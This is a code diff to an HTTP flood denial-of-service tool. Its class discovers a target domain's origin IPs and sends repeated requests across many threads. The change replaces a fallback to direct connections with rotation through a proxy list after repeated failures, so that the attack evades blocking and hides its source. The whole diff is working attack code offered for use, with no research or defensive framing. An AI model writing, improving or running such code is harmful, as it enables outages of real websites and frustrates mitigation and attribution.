@@ -311,14 +311,10 @@ class HTTPFlood:
             self.origin_ips = discover_origin_ips(self.domain)
         
         if config.proxies:
-            self.thread_proxies = []
-            proxy_count = len(config.proxies)
-            for i in range(self.threads):
-                proxy = config.proxies[i % proxy_count]
-                self.thread_proxies.append({'http': proxy, 'https': proxy})
-            print(f"[*] Assigned {len(self.thread_proxies)} proxies to threads (will fallback to direct on errors)")
+            print(f"[*] Loaded {len(config.proxies)} proxies for rotation across all threads")
+            self.use_proxy_rotation = True
         else:
-            self.thread_proxies = None
+            self.use_proxy_rotation = False
         
         config.stats['start_time'] = time.time()
         self.running = True
@@ -337,18 +333,17 @@ class HTTPFlood:
         session.mount('http://', adapter)
         session.mount('https://', adapter)
         
-        current_proxy = None
-        if self.thread_proxies:
-            current_proxy = self.thread_proxies[thread_id % len(self.thread_proxies)]
-            session.proxies = current_proxy
-        
         import warnings
         warnings.filterwarnings('ignore', message='Unverified HTTPS request')
+        
+        current_proxy_index = thread_id % len(config.proxies) if config.proxies else 0
+        if self.use_proxy_rotation:
+            proxy = config.proxies[current_proxy_index]
+            session.proxies = {'http': proxy, 'https': proxy}
         
         end_time = time.time() + self.duration
         local_count = 0
         consecutive_fails = 0
-        no_proxy_mode = False
         
         while self.running and time.time() < end_time:
             try:
@@ -397,10 +392,11 @@ class HTTPFlood:
                 update_stats(success=False)
                 consecutive_fails += 1
                 
-                if consecutive_fails >= 2 and not no_proxy_mode:
+                if consecutive_fails >= 5 and self.use_proxy_rotation:
                     try:
-                        session.proxies = {}
-                        no_proxy_mode = True
+                        current_proxy_index = (current_proxy_index + 1) % len(config.proxies)
+                        proxy = config.proxies[current_proxy_index]
+                        session.proxies = {'http': proxy, 'https': proxy}
                         consecutive_fails = 0
                     except:
                         pass
